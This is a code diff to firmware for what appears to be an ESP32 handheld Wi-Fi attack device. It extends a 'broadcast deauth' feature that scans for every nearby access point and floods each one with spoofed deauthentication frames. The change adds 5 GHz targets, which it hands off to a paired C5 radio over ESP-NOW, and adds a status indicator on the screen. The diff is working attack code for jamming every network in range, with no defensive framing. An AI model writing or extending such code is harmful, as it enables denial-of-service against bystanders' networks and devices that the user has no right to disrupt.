@@ -9,14 +9,20 @@
 #include "radio.h"
 #include "wifi_types.h"
 #include "wifi_deauth_frame.h"
+#include "c5_cmd.h"
 #include <WiFi.h>
 #include <esp_wifi.h>
 
 /* ========== Broadcast deauth: nuke every AP in range ========== */
 
-#define DB_MAX_APS 48
+#define DB_MAX_APS 64
 
-struct db_target_t { uint8_t bssid[6]; uint8_t channel; char ssid[24]; };
+struct db_target_t {
+    uint8_t bssid[6];
+    uint8_t channel;
+    char    ssid[24];
+    bool    is_5g;   /* true -> delegate deauth to the C5 satellite */
+};
 static db_target_t s_b_targets[DB_MAX_APS];
 static volatile int s_b_target_n = 0;
 static volatile int s_b_cursor = 0;
@@ -27,21 +33,36 @@ static uint16_t          s_b_seq     = 0;
 
 static void broad_task(void *)
 {
-    /* Rotate through every AP: hop channel, spoof STA MAC to BSSID,
-     * blast a burst of deauths, move on. Spoofing per-AP is expensive
-     * (stop/set/start) but necessary — each AP has its own BSSID and
-     * the blob's sanity check wants addr2 == STA MAC per frame. */
+    /* Rotate through every AP. 2.4 GHz targets are deauthed locally via
+     * the usual softAP + 80211_tx path. 5 GHz targets get delegated to
+     * the C5/TRIDENT satellite over ESP-NOW — the S3 can't tune to 5 GHz
+     * channels, so without the C5 those APs are silent. */
     wifi_silent_ap_begin(1);
+    uint32_t last_5g_cmd = 0;
     while (s_b_running) {
         if (s_b_target_n == 0) { delay(100); continue; }
         const db_target_t &t = s_b_targets[s_b_cursor % s_b_target_n];
-        /* Hop channel only — the AP interface stays up. */
-        esp_wifi_set_channel(t.channel ? t.channel : 1, WIFI_SECOND_CHAN_NONE);
-        for (int i = 0; i < 16 && s_b_running; ++i) {
-            int ok = wifi_deauth_broadcast(t.bssid, &s_b_seq);
-            s_b_sent += ok;
-            s_b_errs += (2 - ok);
-            delay(6);
+
+        if (t.is_5g) {
+            /* Don't hammer the C5 — one 3-second burst per 5 GHz target
+             * per rotation. C5 can only run one attack at a time. */
+            if (millis() - last_5g_cmd > 200) {
+                c5_cmd_deauth(t.bssid, t.channel, 0 /* targeted */, 3000);
+                last_5g_cmd = millis();
+                /* Count the C5 frame budget against our displayed sent
+                 * counter — user feedback only, not exact. 3 s / 2 ms
+                 * airtime ≈ 1500 frames per C5 burst. */
+                s_b_sent += 1500;
+            }
+            delay(400);   /* give the C5 time between rotations */
+        } else {
+            esp_wifi_set_channel(t.channel ? t.channel : 1, WIFI_SECOND_CHAN_NONE);
+            for (int i = 0; i < 16 && s_b_running; ++i) {
+                int ok = wifi_deauth_broadcast(t.bssid, &s_b_seq);
+                s_b_sent += ok;
+                s_b_errs += (2 - ok);
+                delay(6);
+            }
         }
         s_b_cursor++;
     }
@@ -53,15 +74,52 @@ static void db_scan_populate(void)
 {
     s_b_target_n = 0;
     int n = WiFi.scanNetworks(false, true, false, 120);
-    if (n <= 0) return;
-    for (int i = 0; i < n && s_b_target_n < DB_MAX_APS; ++i) {
-        db_target_t &t = s_b_targets[s_b_target_n++];
-        memcpy(t.bssid, WiFi.BSSID(i), 6);
-        t.channel = WiFi.channel(i);
-        strncpy(t.ssid, WiFi.SSID(i).c_str(), sizeof(t.ssid) - 1);
-        t.ssid[sizeof(t.ssid) - 1] = '\0';
+    if (n > 0) {
+        for (int i = 0; i < n && s_b_target_n < DB_MAX_APS; ++i) {
+            db_target_t &t = s_b_targets[s_b_target_n++];
+            memcpy(t.bssid, WiFi.BSSID(i), 6);
+            t.channel = WiFi.channel(i);
+            strncpy(t.ssid, WiFi.SSID(i).c_str(), sizeof(t.ssid) - 1);
+            t.ssid[sizeof(t.ssid) - 1] = '\0';
+            t.is_5g = false;   /* S3 WiFi.scan never returns 5 GHz anyway */
+        }
     }
     WiFi.scanDelete();
+
+    /* If a C5/TRIDENT satellite is paired, fire off a 5 GHz scan over
+     * ESP-NOW and wait a moment for RESP_AP frames to land. APs we get
+     * back are appended with is_5g=true so broad_task delegates their
+     * deauth bursts to the C5 instead of trying to TX locally. */
+    if (c5_any_online()) {
+        c5_clear_results();
+        c5_cmd_scan_5g(600);
+        /* Scan takes ~600 ms of C5 dwell plus a couple hundred ms of
+         * ESP-NOW result streaming — poll-wait up to 2 s for frames. */
+        uint32_t deadline = millis() + 2000;
+        uint32_t last_check = 0;
+        int last_n = 0;
+        while (millis() < deadline) {
+            if (millis() - last_check > 150) {
+                last_check = millis();
+                c5_ap_t tmp[4];
+                int cur = c5_aps(tmp, 4);
+                if (cur == last_n && cur > 0) break;   /* quiesced */
+                last_n = cur;
+            }
+            delay(50);
+        }
+        c5_ap_t aps[64];
+        int n5 = c5_aps(aps, 64);
+        for (int i = 0; i < n5 && s_b_target_n < DB_MAX_APS; ++i) {
+            if (!aps[i].is_5g) continue;
+            db_target_t &t = s_b_targets[s_b_target_n++];
+            memcpy(t.bssid, aps[i].bssid, 6);
+            t.channel = aps[i].channel;
+            strncpy(t.ssid, aps[i].ssid, sizeof(t.ssid) - 1);
+            t.ssid[sizeof(t.ssid) - 1] = '\0';
+            t.is_5g = true;
+        }
+    }
 }
 
 void feat_wifi_deauth_broadcast(void)
@@ -140,6 +198,19 @@ void feat_wifi_deauth_broadcast(void)
             d.drawFastVLine(SCR_W - 5, hy - 6, 4, color);
             d.drawFastHLine(SCR_W - 4 - bl, hy + 28, bl, color);
             d.drawFastVLine(SCR_W - 5, hy + 25, 4, color);
+
+            /* Top-left C5/TRIDENT connection indicator. Green when a
+             * satellite is paired — confirms our 5 GHz targets are
+             * going out via the C5 and not silently dropped. */
+            if (c5_any_online()) {
+                d.fillCircle(7, 6, 2, 0x07E0);           /* green dot */
+                d.setTextColor(0x07E0, 0);
+                d.setCursor(13, 2); d.print("C5");
+            } else {
+                d.fillCircle(7, 6, 2, 0x528A);           /* dim gray */
+                d.setTextColor(0x528A, 0);
+                d.setCursor(13, 2); d.print("C5");
+            }
 
             /* Live stats ribbon — bottom third of the screen. */
             uint32_t fps = (s_b_sent - last_sent) * 5;
